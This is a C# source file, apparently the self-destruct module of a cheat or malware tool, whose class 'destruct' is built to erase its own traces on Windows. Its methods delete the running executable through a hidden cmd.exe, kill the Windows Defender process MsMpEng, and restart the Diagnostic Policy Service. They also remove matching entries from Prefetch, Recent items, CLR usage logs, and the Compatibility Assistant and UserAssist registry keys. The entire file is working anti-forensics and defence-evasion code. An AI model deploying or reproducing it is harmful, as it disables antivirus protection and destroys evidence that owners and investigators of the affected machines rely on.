using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Policy;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;

namespace skidderino
{
    public class destruct
    {
        public void selfdelete(bool selfdelete)
        {
            if (selfdelete)
            {
                string filename = AppDomain.CurrentDomain.FriendlyName;
                ProcessStartInfo Info = new ProcessStartInfo();
                Info.Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + filename;
                Info.WindowStyle = ProcessWindowStyle.Hidden;
                Info.CreateNoWindow = true;
                Info.FileName = "cmd.exe";
                Process.Start(Info);
            }
        }

        public void iwillnotsaywhatthisis()
        {
            servicecontroller("DPS");
        }

        public void windef(bool windef)
        {
            if (windef)
            {
                Process[] process = Process.GetProcessesByName("MsMpeng");
                foreach (Process p in process)
                {
                    p.Kill();
                }
            }
        }

        public void prefetch()
        {
            string filename = AppDomain.CurrentDomain.FriendlyName;
            try
            {
                DirectoryInfo directory = new DirectoryInfo(path: @"C:\Windows\Prefetch");
                FileInfo[] Files = directory.GetFiles(searchPattern: filename + "*");
                foreach (FileInfo file in Files)
                {
                    File.Delete(file.FullName);
                }
            }
            catch { }
        }

        public void recent()
        {
            string filename = AppDomain.CurrentDomain.FriendlyName;
            try
            {
                DirectoryInfo directory = new DirectoryInfo(path: Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Microsoft\Windows\Recent");
                FileInfo[] Files = directory.GetFiles(searchPattern: filename + "*");
                foreach (FileInfo file in Files)
                {
                    File.Delete(file.FullName);
                }
            }
            catch { }
        }

        public void servicecontroller(string process)
        {
            ServiceController serviceController = new ServiceController(process);
            try
            {
                if ((serviceController.Status.Equals(ServiceControllerStatus.Running)) || (serviceController.Status.Equals(ServiceControllerStatus.StartPending)))
                {
                    serviceController.Stop();
                }
                serviceController.WaitForStatus(ServiceControllerStatus.Stopped);
                serviceController.Start();
                serviceController.WaitForStatus(ServiceControllerStatus.Running);
            }
            catch { }
        }

        public void iwillnotsaywhatthisis2()
        {
            string filename = AppDomain.CurrentDomain.FriendlyName;
            try
            {
                DirectoryInfo directory = new DirectoryInfo(path: Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Microsoft\\CLR_v2.0\\UsageLogs");
                DirectoryInfo directory1 = new DirectoryInfo(path: Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Microsoft\\CLR_v2.0_32\\UsageLogs");
                DirectoryInfo directory2 = new DirectoryInfo(path: Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Microsoft\\CLR_v2.0_32\\UsageLogs");
                DirectoryInfo directory3 = new DirectoryInfo(path: Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs");
                DirectoryInfo directory4 = new DirectoryInfo(path: Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Microsoft\\CLR_v4.0_32\\UsageLogs");
                FileInfo[] Files = directory.GetFiles(searchPattern: filename + "*");
                foreach (FileInfo file in Files)
                {
                    File.Delete(file.FullName);
                }

                FileInfo[] Files1 = directory1.GetFiles(searchPattern: filename + "*");
                foreach (FileInfo file in Files1)
                {
                    File.Delete(file.FullName);
                }

                FileInfo[] Files2 = directory2.GetFiles(searchPattern: filename + "*");
                foreach (FileInfo file in Files2)
                {
                    File.Delete(file.FullName);
                }

                FileInfo[] Files3 = directory3.GetFiles(searchPattern: filename + "*");
                foreach (FileInfo file in Files3)
                {
                    File.Delete(file.FullName);
                }

                FileInfo[] Files4 = directory4.GetFiles(searchPattern: filename + "*");
                foreach (FileInfo file in Files4)
                {
                    File.Delete(file.FullName);
                }
            }
            catch { }
        }

        public void regedit()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store", true))
            {
                if (key != null && storefolder(key) == true) key.DeleteValue(Assembly.GetExecutingAssembly().Location);
            }
            using (RegistryKey regkey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist", true))
            {
                if (regkey != null)
                {
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{9E04CAB2-CC14-11DF-BB8C-A2F1DED72085}\\Count", true))
                    {
                        if (key != null && userassistfolder(key) == true) key.DeleteValue(brodm.Transform(Assembly.GetExecutingAssembly().Location));
                    }
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{A3D53349-6E61-4557-8FC7-0028EDCEEBF6}\\Count", true))
                    {
                        if (key != null && userassistfolder(key) == true) key.DeleteValue(brodm.Transform(Assembly.GetExecutingAssembly().Location));
                    }
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{B267E3AD-A825-4A09-82B9-EEC22AA3B847}\\Count", true))
                    {
                        if (key != null && userassistfolder(key) == true) key.DeleteValue(brodm.Transform(Assembly.GetExecutingAssembly().Location));
                    }
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{BCB48336-4DDD-48FF-BB0B-D3190DACB3E2}\\Count", true))
                    {
                        if (key != null && userassistfolder(key) == true) key.DeleteValue(brodm.Transform(Assembly.GetExecutingAssembly().Location));
                    }
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CAA59E3C-4792-41A5-9909-6A6A8D32490E}\\Count", true))
                    {
                        if (key != null && userassistfolder(key) == true) key.DeleteValue(brodm.Transform(Assembly.GetExecutingAssembly().Location));
                    }
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count", true))
                    {
                        if (key != null && userassistfolder(key) == true) key.DeleteValue(brodm.Transform(Assembly.GetExecutingAssembly().Location));
                    }
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{F2A1CB5A-E3CC-4A2E-AF9D-505A7009D442}\\Count", true)) //
                    {
                        if (key != null && userassistfolder(key) == true) key.DeleteValue(brodm.Transform(Assembly.GetExecutingAssembly().Location));
                    }
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}\\Count", true))
                    {
                        if (key != null && userassistfolder(key) == true) key.DeleteValue(brodm.Transform(Assembly.GetExecutingAssembly().Location));
                    }
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{FA99DFC7-6AC2-453A-A5E2-5E2AFF4507BD}\\Count", true))
                    {
                        if (key != null && userassistfolder(key) == true) key.DeleteValue(brodm.Transform(Assembly.GetExecutingAssembly().Location));
                    }
                }
            }
        }
        public static bool userassistfolder(RegistryKey key)
        {
            return (key.GetValueNames().Contains(brodm.Transform(Assembly.GetExecutingAssembly().Location)));
        }
        public static bool storefolder(RegistryKey key)
        {
            return (key.GetValueNames().Contains(Assembly.GetExecutingAssembly().Location));
        }
    }
}